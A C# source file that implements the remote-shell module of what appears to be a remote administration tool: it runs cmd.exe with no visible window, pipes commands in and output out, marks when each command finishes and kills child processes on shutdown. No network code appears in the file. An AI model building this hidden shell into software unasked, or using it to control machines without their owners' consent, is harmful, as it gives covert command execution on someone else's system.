using System;
using System.Diagnostics;

namespace bc.srv.Modules.Remote_Shell
{
    internal class ShellWorker
    {
        private Process process;
        public string SCmdComplete = "BC_Shell_End"; // QUESTA LINEA MI INDICA CHE IL COMANDO è STATO CONCLUSO
        public event DataReceivedEventHandler StdOut;
        public event DataReceivedEventHandler StdError;

        /// <summary>
        ///     Inizializzazione
        /// </summary>
        public bool Initialize()
        {
            try
            {
                if (this.StdOut == null && this.StdError == null)
                    return false;

                string comspec;
                try
                {
                    comspec = Environment.GetEnvironmentVariable("comspec");
                }
                catch
                {
                    return false;
                }

                if (string.IsNullOrEmpty(comspec))
                    return false;

                this.process = new Process
                {
                    StartInfo =
                    {
                        FileName = comspec,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        CreateNoWindow = true,
                        UseShellExecute = false
                    },
                    EnableRaisingEvents = true
                };

                this.process.ErrorDataReceived += this.StdError;
                this.process.OutputDataReceived += this.StdOut;
                this.process.Start();

                if (this.StdError != null)
                    this.process.BeginErrorReadLine();

                if (this.StdOut != null)
                    this.process.BeginOutputReadLine();

                return true;
            }
            catch
            {
                return false;
            }
        }
        //-------------

        /// <summary>
        ///     Esegue il comando
        /// </summary>
        /// <param name="command">The command.</param>
        public void Execute(string command)
        {
            try
            {
                if (this.process == null || this.StdOut == null && this.StdError == null || this.process.HasExited)
                {
                    if (this.process != null)
                        this.Terminate();

                    this.Initialize();
                }

                if (this.process != null)
                {
                    this.process.StandardInput.WriteLine(command);
                    this.process.StandardInput.WriteLine(""); // chiedo localizzazione
                    this.process.StandardInput.WriteLine("@echo " + this.SCmdComplete); // fine comandi
                }
            }
            catch
            {
            }
        }

        /// <summary>
        ///     termina processi
        /// </summary>
        public void Terminate()
        {
            try
            {
                if (this.process == null || this.process.HasExited)
                    return;

                var processes = Process.GetProcesses();
                foreach (var process in processes)
                    try
                    {
                        var pfc = new PerformanceCounter("Process", "Creating Process Id", process.ProcessName);
                        if ((int) pfc.RawValue == this.process.Id)
                            process.Kill();
                    }
                    catch
                    {
                    }

                this.process.Kill();
                this.process.Close();
                this.process = null;
            }
            catch
            {
            }
        }
    }
}